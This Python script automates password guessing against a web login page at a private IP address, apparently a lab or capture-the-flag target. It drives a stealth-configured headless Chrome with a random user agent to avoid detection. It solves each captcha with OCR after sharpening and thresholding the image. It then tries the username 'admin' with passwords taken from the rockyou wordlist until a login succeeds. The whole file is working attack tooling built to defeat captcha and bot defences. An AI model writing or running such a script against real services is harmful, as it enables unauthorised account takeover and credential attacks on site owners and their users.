from selenium.webdriver.common.by import By
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service
from selenium_stealth import stealth
import time
from fake_useragent import UserAgent
from PIL import Image, ImageEnhance, ImageFilter
import pytesseract
import io
import os

options = Options()
ua = UserAgent()
userAgent = ua.random
options.add_argument('--no-sandbox')
options.add_argument('--headless')
options.add_argument("start-maximized")
options.add_argument(f'user-agent={userAgent}')
options.add_argument('--disable-dev-shm-usage')
options.add_argument('--disable-cache')
options.add_argument('--disable-gpu')
chrome = webdriver.Chrome(options=options)
stealth(chrome,
    languages=["en-US", "en"],
    vendor="Google Inc.",
    platform="Win32",
    webgl_vendor="Intel Inc.",
    renderer="Intel Iris OpenGL Engine",
    fix_hairline=True,
)
rockyou_file = open('/usr/share/wordlists/rockyou.txt', 'r')
rockyou_pass = rockyou_file.readline().strip()
i = 0
while i <= 100:
    chrome.get('http://10.81.153.205')
    time.sleep(0.5)
    captcha_img_element = chrome.find_element(By.TAG_NAME, "img")
    captcha_png = captcha_img_element.screenshot_as_png
    image = Image.open(io.BytesIO(captcha_png)).convert("L")
    image = image.resize((image.width * 2, image.height * 2), Image.LANCZOS)
    image = image.filter(ImageFilter.SHARPEN)
    image = ImageEnhance.Contrast(image).enhance(2.0)
    image = image.point(lambda x: 0 if x < 140 else 255, '1')
    captcha_text = pytesseract.image_to_string(
        image,
        config='--psm 7 -c tessedit_char_whitelist=ABCDEFGHIJKLMNOPQRSTUVWXYZ23456789'
    ).strip().replace(" ", "").replace("\n", "").upper()
    username = 'admin'
    password = rockyou_file.readline().strip()
    chrome.find_element(By.ID, "username").send_keys(username)
    chrome.find_element(By.ID, "password").send_keys(password)
    chrome.find_element(By.ID, "captcha_input").send_keys(captcha_text)
    chrome.find_element(By.ID, "login-btn").click()
    time.sleep(0.5)
    print(f'Trying {username}:{password} captcha is {captcha_text}')
    i += 1
    if 'Login failed.' not in chrome.current_url:
        print(f"[+] Login successful with password: {password}")
        print(f"[-] {chrome.current_url}")
        break
    print(f"[-] Login failed")
